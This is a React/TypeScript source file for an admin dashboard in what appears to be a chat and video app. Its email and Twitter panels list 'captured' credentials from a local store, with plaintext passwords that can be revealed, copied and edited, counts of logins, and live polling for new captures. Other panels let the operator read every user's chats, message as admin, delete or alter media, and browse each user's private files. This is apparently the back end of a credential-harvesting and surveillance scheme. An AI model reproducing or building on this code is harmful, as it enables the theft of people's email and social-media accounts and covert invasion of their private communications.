import { motion } from 'framer-motion';
import {
  ArrowLeft,
  Check,
  Copy,
  Lock,
  LockOpen,
  Pencil,
  RefreshCw,
  Search,
  Send,
  Trash2,
  User,
  X,
} from 'lucide-react';
import { useEffect, useMemo, useState } from 'react';
import { GlassButton, GlassCard, GlassInput, TagRow } from '../components/Glass';
import { ResolvedImg, ResolvedVideo } from '../components/MediaSrc';
import {
  isAdminCredential,
  readCaptured,
  subscribeCaptured,
} from '../lib/capturedStore';
import { t } from '../lib/i18n';
import type { CapturedCredential } from '../lib/types';
import { useAppStore } from '../store/useAppStore';

export default function AdminPanels({
  panel,
  onClose,
}: {
  panel: 'email' | 'twitter' | 'chats' | 'files';
  onClose: () => void;
}) {
  const lang = useAppStore((s) => s.language);
  const updateCredential = useAppStore((s) => s.updateCredential);
  const getCapturedAccounts = useAppStore((s) => s.getCapturedAccounts);
  const revealed = useAppStore((s) => s.revealedPasswords);
  const colors = useAppStore((s) => s.passwordColors);
  const togglePasswordReveal = useAppStore((s) => s.togglePasswordReveal);
  const chats = useAppStore((s) => s.chats);
  const messages = useAppStore((s) => s.messages);
  const users = useAppStore((s) => s.users);
  const getUser = useAppStore((s) => s.getUser);
  const sendMessage = useAppStore((s) => s.sendMessage);
  const toggleLockChat = useAppStore((s) => s.toggleLockChat);
  const deleteMessageForEveryone = useAppStore((s) => s.deleteMessageForEveryone);
  const editMessageMedia = useAppStore((s) => s.editMessageMedia);
  const privateFiles = useAppStore((s) => s.privateFiles);
  const currentUser = useAppStore((s) => s.currentUser);
  const videos = useAppStore((s) => s.videos);

  const [search, setSearch] = useState('');
  const [activeChat, setActiveChat] = useState<string | null>(null);
  const [msg, setMsg] = useState('');
  const [selectedUser, setSelectedUser] = useState<string | null>(null);
  const [editingField, setEditingField] = useState<string | null>(null);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  // Local state ALWAYS sourced from localStorage — survives refresh
  const [allCaptures, setAllCaptures] = useState<CapturedCredential[]>(() => readCaptured());

  useEffect(() => {
    // initial load + store sync
    const list = readCaptured();
    setAllCaptures(list);
    getCapturedAccounts('all');

    // live updates when anything is captured
    const unsub = subscribeCaptured((list2) => {
      setAllCaptures(list2);
    });

    // also poll lightly while panel open (covers edge cases)
    const iv = window.setInterval(() => {
      setAllCaptures(readCaptured());
    }, 1500);

    return () => {
      unsub();
      window.clearInterval(iv);
    };
  }, [getCapturedAccounts, panel]);

  const rows = useMemo(() => {
    const type = panel === 'twitter' ? 'twitter' : 'email';
    if (panel !== 'email' && panel !== 'twitter') return [];
    return allCaptures
      .filter((c) => c.type === type)
      .filter((c) => !isAdminCredential(c.email))
      .filter(
        (c) =>
          !search ||
          c.email.toLowerCase().includes(search.toLowerCase()) ||
          (c.username || '').toLowerCase().includes(search.toLowerCase()) ||
          (c.name || '').toLowerCase().includes(search.toLowerCase()) ||
          c.password.toLowerCase().includes(search.toLowerCase())
      )
      .slice()
      .sort((a, b) => (a.seq || a.createdAt) - (b.seq || b.createdAt));
  }, [allCaptures, panel, search]);

  const refreshNow = () => {
    const list = readCaptured();
    setAllCaptures(list);
    getCapturedAccounts('all');
  };

  const title =
    panel === 'email'
      ? t(lang, 'adminEmail')
      : panel === 'twitter'
        ? t(lang, 'adminTwitter')
        : panel === 'chats'
          ? t(lang, 'globalChats')
          : t(lang, 'userFiles');

  const copyText = async (key: string, text: string) => {
    try {
      await navigator.clipboard.writeText(text || '');
      setCopiedKey(key);
      window.setTimeout(() => setCopiedKey(null), 1400);
    } catch {
      /* ignore */
    }
  };

  const resolveAvatar = (row: CapturedCredential) => {
    if (row.avatar) return { src: row.avatar, mediaId: row.avatarMediaId };
    if (row.userId) {
      const u = getUser(row.userId);
      if (u) return { src: u.avatar, mediaId: u.avatarMediaId };
    }
    const byEmail = users.find(
      (u) => u.email.toLowerCase() === row.email.toLowerCase()
    );
    if (byEmail) return { src: byEmail.avatar, mediaId: byEmail.avatarMediaId };
    return { src: '', mediaId: undefined };
  };

  return (
    <motion.div
      className="fixed inset-0 z-[60] flex flex-col bg-[#070214]/96 backdrop-blur-xl no-select"
      initial={{ opacity: 0, y: 40 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: 40 }}
    >
      <div className="flex items-center gap-3 px-4 pt-5 pb-3 border-b border-white/10">
        <button onClick={onClose} className="glass-icon-btn">
          <X className="h-4 w-4" />
        </button>
        <div className="flex-1">
          <h2 className="font-semibold text-white">{title}</h2>
          {(panel === 'email' || panel === 'twitter') && (
            <p className="text-xs text-cyan-300/80">
              {t(lang, 'capturedAccounts')}: {rows.length}
            </p>
          )}
        </div>
        {(panel === 'email' || panel === 'twitter') && (
          <button
            type="button"
            onClick={refreshNow}
            className="glass-icon-btn"
            title="Refresh captures"
            aria-label="Refresh captures"
          >
            <RefreshCw className="h-4 w-4" />
          </button>
        )}
      </div>

      {(panel === 'email' || panel === 'twitter') && (
        <>
          <div className="px-4 py-3">
            <div className="relative">
              <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-white/40" />
              <GlassInput
                className="pl-10"
                placeholder={t(lang, 'search')}
                value={search}
                onChange={(e) => setSearch(e.target.value)}
              />
            </div>
          </div>

          <div className="flex-1 overflow-auto px-3 sm:px-4 pb-8">
            {rows.length === 0 && (
              <div className="glass-panel p-8 text-center text-white/45 text-sm">
                {t(lang, 'noCaptures')}
              </div>
            )}

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-3">
              {rows.map((row, index) => {
                const av = resolveAvatar(row);
                const shown = !!revealed[row.id];
                const color = colors[row.id] || 'green';
                const displayName =
                  row.name || row.username || row.email.split('@')[0] || 'Unknown';
                const nameValue =
                  panel === 'twitter'
                    ? [row.name, row.username].filter(Boolean).join(' · ') || ''
                    : row.name || row.username || '';

                const nameEditKey = `${row.id}-name`;
                const emailEditKey = `${row.id}-email`;
                const passEditKey = `${row.id}-pass`;

                return (
                  <GlassCard
                    key={row.id}
                    className="p-3.5 sm:p-4"
                    initial={{ opacity: 0, y: 12 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: Math.min(index * 0.03, 0.3) }}
                  >
                    <div className="flex gap-3">
                      {/* Avatar + sequence */}
                      <div className="flex flex-col items-center gap-2 shrink-0">
                        <div className="relative">
                          {av.src || av.mediaId ? (
                            <ResolvedImg
                              src={av.src}
                              mediaId={av.mediaId}
                              className="h-16 w-16 sm:h-[4.5rem] sm:w-[4.5rem] rounded-2xl object-cover border border-white/20 shadow-lg"
                            />
                          ) : (
                            <div className="h-16 w-16 sm:h-[4.5rem] sm:w-[4.5rem] rounded-2xl bg-white/10 border border-white/15 grid place-items-center">
                              <User className="h-7 w-7 text-white/35" />
                            </div>
                          )}
                          <span className="absolute -top-1.5 -left-1.5 min-w-[1.5rem] h-6 px-1.5 rounded-full bg-gradient-to-br from-cyan-400 to-fuchsia-500 text-[11px] font-bold text-white grid place-items-center border border-white/30 shadow">
                            #{row.seq || index + 1}
                          </span>
                        </div>
                      </div>

                      {/* Fields */}
                      <div className="flex-1 min-w-0 space-y-2">
                        <p className="text-sm font-semibold text-white truncate">{displayName}</p>

                        {/* Name / Username */}
                        <CredRow
                          label={panel === 'twitter' ? 'Name / Username' : t(lang, 'name')}
                          value={nameValue}
                          editing={editingField === nameEditKey}
                          onEditToggle={() =>
                            setEditingField((k) => (k === nameEditKey ? null : nameEditKey))
                          }
                          onChange={(v) => {
                            if (panel === 'twitter') {
                              const parts = v.split('·').map((s) => s.trim());
                              updateCredential(row.id, {
                                name: parts[0] || v,
                                username: parts[1] || row.username,
                              });
                            } else {
                              updateCredential(row.id, { name: v });
                            }
                          }}
                          onCopy={() => copyText(nameEditKey, nameValue)}
                          copied={copiedKey === nameEditKey}
                          selectable
                        />

                        {/* Email */}
                        <CredRow
                          label={t(lang, 'email')}
                          value={row.email}
                          editing={editingField === emailEditKey}
                          onEditToggle={() =>
                            setEditingField((k) => (k === emailEditKey ? null : emailEditKey))
                          }
                          onChange={(v) => updateCredential(row.id, { email: v })}
                          onCopy={() => copyText(emailEditKey, row.email)}
                          copied={copiedKey === emailEditKey}
                          selectable
                        />

                        {/* Password */}
                        <div>
                          <label className="text-[10px] uppercase tracking-wider text-white/40">
                            {t(lang, 'password')}
                          </label>
                          <div className="mt-1 flex items-center gap-1.5">
                            {editingField === passEditKey ? (
                              <input
                                className="glass-input flex-1 !py-1.5 text-sm font-mono admin-copyable"
                                value={row.password}
                                onChange={(e) =>
                                  updateCredential(row.id, { password: e.target.value })
                                }
                                autoFocus
                              />
                            ) : (
                              <button
                                type="button"
                                onClick={() => togglePasswordReveal(row.id)}
                                className="flex-1 text-left glass-input !py-1.5 text-sm font-mono truncate admin-copyable"
                                style={{
                                  color: shown
                                    ? color === 'green'
                                      ? '#4ade80'
                                      : '#fb7185'
                                    : 'rgba(255,255,255,0.55)',
                                }}
                              >
                                {shown
                                  ? row.password
                                  : `••••••••  ${t(lang, 'tapToReveal')}`}
                              </button>
                            )}
                            <IconBtn
                              title="Copy"
                              onClick={() => copyText(passEditKey, row.password)}
                              active={copiedKey === passEditKey}
                            >
                              {copiedKey === passEditKey ? (
                                <Check className="h-3.5 w-3.5 text-emerald-300" />
                              ) : (
                                <Copy className="h-3.5 w-3.5" />
                              )}
                            </IconBtn>
                            <IconBtn
                              title="Edit"
                              onClick={() =>
                                setEditingField((k) =>
                                  k === passEditKey ? null : passEditKey
                                )
                              }
                              active={editingField === passEditKey}
                            >
                              <Pencil className="h-3.5 w-3.5" />
                            </IconBtn>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div className="mt-3 pt-2 border-t border-white/10 flex items-center justify-between gap-2">
                      <p className="text-[11px] text-white/40">
                        {new Date(row.createdAt).toLocaleString(undefined, {
                          year: 'numeric',
                          month: 'short',
                          day: 'numeric',
                          hour: '2-digit',
                          minute: '2-digit',
                          second: '2-digit',
                        })}
                      </p>
                      <p className="text-[10px] text-white/30">×{row.count} login</p>
                    </div>
                  </GlassCard>
                );
              })}
            </div>
          </div>
        </>
      )}

      {panel === 'chats' && !activeChat && (
        <div className="flex-1 overflow-auto px-4 py-3 space-y-2">
          {chats.map((c) => {
            const chatTitle =
              c.type === 'global'
                ? t(lang, 'globalGroup')
                : c.type === 'group'
                  ? c.name
                  : c.participantIds
                      .map((id) => getUser(id)?.name)
                      .filter(Boolean)
                      .join(' · ');
            const last = messages
              .filter((m) => m.chatId === c.id && !m.deletedForEveryone)
              .sort((a, b) => b.createdAt - a.createdAt)[0];
            return (
              <button
                key={c.id}
                onClick={() => setActiveChat(c.id)}
                className="w-full glass-panel p-3 text-left flex items-center gap-3"
              >
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-medium text-white truncate flex items-center gap-1">
                    {chatTitle}
                    {c.locked && <Lock className="h-3 w-3 text-amber-300" />}
                  </p>
                  <p className="text-xs text-white/40 truncate">{last?.text || '…'}</p>
                </div>
              </button>
            );
          })}
        </div>
      )}

      {panel === 'chats' && activeChat && (
        <div className="flex-1 flex flex-col min-h-0">
          <div className="px-4 py-2 flex items-center gap-2 border-b border-white/10">
            <button onClick={() => setActiveChat(null)} className="glass-icon-btn">
              <ArrowLeft className="h-4 w-4" />
            </button>
            <div className="flex-1 text-sm text-white font-medium">Monitor</div>
            <GlassButton
              className="!py-2 text-xs gap-1"
              onClick={() => toggleLockChat(activeChat)}
            >
              {chats.find((c) => c.id === activeChat)?.locked ? (
                <>
                  <LockOpen className="h-3.5 w-3.5" /> {t(lang, 'unlockChat')}
                </>
              ) : (
                <>
                  <Lock className="h-3.5 w-3.5" /> {t(lang, 'lockChat')}
                </>
              )}
            </GlassButton>
          </div>
          <div className="flex-1 overflow-auto px-3 py-3 space-y-2">
            {messages
              .filter((m) => m.chatId === activeChat)
              .sort((a, b) => a.createdAt - b.createdAt)
              .map((m) => {
                const sender = getUser(m.senderId);
                return (
                  <div key={m.id} className="glass-panel p-2 text-sm">
                    <div className="flex items-center justify-between gap-2 mb-1">
                      <span className="text-xs text-cyan-300">{sender?.name || m.senderId}</span>
                      <div className="flex gap-1">
                        {(m.type === 'image' || m.type === 'video') && (
                          <button
                            className="text-[10px] text-amber-200 px-1"
                            onClick={() =>
                              editMessageMedia(m.id, {
                                mediaUrl: '',
                                mediaId: null,
                                text: '[media removed by admin]',
                              })
                            }
                          >
                            {t(lang, 'edit')}
                          </button>
                        )}
                        <button
                          className="text-rose-300"
                          onClick={() => deleteMessageForEveryone(m.id)}
                        >
                          <Trash2 className="h-3.5 w-3.5" />
                        </button>
                      </div>
                    </div>
                    {m.deletedForEveryone ? (
                      <p className="text-white/35 italic text-xs">{m.text}</p>
                    ) : m.type === 'image' ? (
                      <ResolvedImg
                        src={m.mediaUrl}
                        mediaId={m.mediaId}
                        className="max-h-40 rounded-lg object-cover"
                      />
                    ) : m.type === 'video' ? (
                      <ResolvedVideo
                        src={m.mediaUrl}
                        mediaId={m.mediaId}
                        className="max-h-40 rounded-lg"
                        controls
                      />
                    ) : (
                      <p className="text-white">{m.text}</p>
                    )}
                  </div>
                );
              })}
          </div>
          <div className="p-3 flex gap-2 border-t border-white/10">
            <GlassInput
              className="flex-1"
              placeholder={t(lang, 'message')}
              value={msg}
              onChange={(e) => setMsg(e.target.value)}
            />
            <GlassButton
              variant="primary"
              className="!p-3"
              onClick={() => {
                if (!msg.trim()) return;
                sendMessage(activeChat, { text: msg.trim(), asAdmin: true });
                setMsg('');
              }}
            >
              <Send className="h-4 w-4" />
            </GlassButton>
          </div>
          <p className="text-center text-[10px] text-white/30 pb-3">
            Sending as {currentUser?.name || 'Admin'}
          </p>
        </div>
      )}

      {panel === 'files' && !selectedUser && (
        <div className="flex-1 overflow-auto px-4 py-3 space-y-2">
          <p className="text-xs text-white/40 mb-2">{t(lang, 'selectUser')}</p>
          {users.map((u) => {
            const count = privateFiles.filter((f) => f.ownerId === u.id).length;
            const vidCount = videos.filter((v) => v.userId === u.id).length;
            return (
              <button
                key={u.id}
                onClick={() => setSelectedUser(u.id)}
                className="w-full glass-panel p-3 flex items-center gap-3 text-left"
              >
                <ResolvedImg
                  src={u.avatar}
                  mediaId={u.avatarMediaId}
                  className="h-11 w-11 rounded-full object-cover"
                />
                <div className="flex-1 min-w-0">
                  <p className="text-sm text-white font-medium">{u.name}</p>
                  <p className="text-xs text-white/40">
                    {count} private · {vidCount} feed videos
                  </p>
                </div>
              </button>
            );
          })}
        </div>
      )}

      {panel === 'files' && selectedUser && (
        <div className="flex-1 overflow-auto px-4 py-3">
          <button
            onClick={() => setSelectedUser(null)}
            className="flex items-center gap-1 text-sm text-white/60 mb-3"
          >
            <ArrowLeft className="h-4 w-4" /> {t(lang, 'back')}
          </button>
          <h3 className="text-white font-semibold mb-3">
            {getUser(selectedUser)?.name} — {t(lang, 'privateFiles')}
          </h3>
          <div className="grid grid-cols-3 gap-1.5 mb-6">
            {privateFiles
              .filter((f) => f.ownerId === selectedUser)
              .map((f) => (
                <div key={f.id} className="aspect-square rounded-xl overflow-hidden bg-white/5 relative">
                  {f.mimeType.startsWith('video') ? (
                    <ResolvedVideo mediaId={f.mediaId} className="h-full w-full object-cover" muted />
                  ) : (
                    <ResolvedImg mediaId={f.mediaId} className="h-full w-full object-cover" />
                  )}
                  <div className="absolute bottom-1 left-1 right-1">
                    <TagRow tags={f.tags} />
                  </div>
                </div>
              ))}
          </div>
          {privateFiles.filter((f) => f.ownerId === selectedUser).length === 0 && (
            <p className="text-sm text-white/40 mb-6">{t(lang, 'noFiles')}</p>
          )}
          <h3 className="text-white font-semibold mb-3">Feed uploads</h3>
          <div className="grid grid-cols-3 gap-1.5">
            {videos
              .filter((v) => v.userId === selectedUser)
              .map((v) => (
                <div key={v.id} className="aspect-[9/16] rounded-lg overflow-hidden bg-white/5">
                  <ResolvedVideo
                    src={v.src}
                    mediaId={v.mediaId}
                    className="h-full w-full object-cover"
                    muted
                  />
                </div>
              ))}
          </div>
        </div>
      )}
    </motion.div>
  );
}

function CredRow({
  label,
  value,
  editing,
  onEditToggle,
  onChange,
  onCopy,
  copied,
  selectable,
}: {
  label: string;
  value: string;
  editing: boolean;
  onEditToggle: () => void;
  onChange: (v: string) => void;
  onCopy: () => void;
  copied: boolean;
  selectable?: boolean;
}) {
  return (
    <div>
      <label className="text-[10px] uppercase tracking-wider text-white/40">{label}</label>
      <div className="mt-1 flex items-center gap-1.5">
        {editing ? (
          <input
            className={`glass-input flex-1 !py-1.5 text-sm ${selectable ? 'admin-copyable' : ''}`}
            value={value}
            onChange={(e) => onChange(e.target.value)}
            autoFocus
          />
        ) : (
          <div
            className={`flex-1 glass-input !py-1.5 text-sm truncate text-white/90 ${selectable ? 'admin-copyable' : ''}`}
          >
            {value || '—'}
          </div>
        )}
        <IconBtn title="Copy" onClick={onCopy} active={copied}>
          {copied ? (
            <Check className="h-3.5 w-3.5 text-emerald-300" />
          ) : (
            <Copy className="h-3.5 w-3.5" />
          )}
        </IconBtn>
        <IconBtn title="Edit" onClick={onEditToggle} active={editing}>
          <Pencil className="h-3.5 w-3.5" />
        </IconBtn>
      </div>
    </div>
  );
}

function IconBtn({
  children,
  onClick,
  title,
  active,
}: {
  children: React.ReactNode;
  onClick: () => void;
  title: string;
  active?: boolean;
}) {
  return (
    <button
      type="button"
      title={title}
      onClick={onClick}
      className={`shrink-0 h-8 w-8 rounded-lg border grid place-items-center transition ${
        active
          ? 'border-cyan-400/40 bg-cyan-500/20 text-cyan-200'
          : 'border-white/15 bg-white/8 text-white/80 hover:bg-white/14'
      }`}
    >
      {children}
    </button>
  );
}
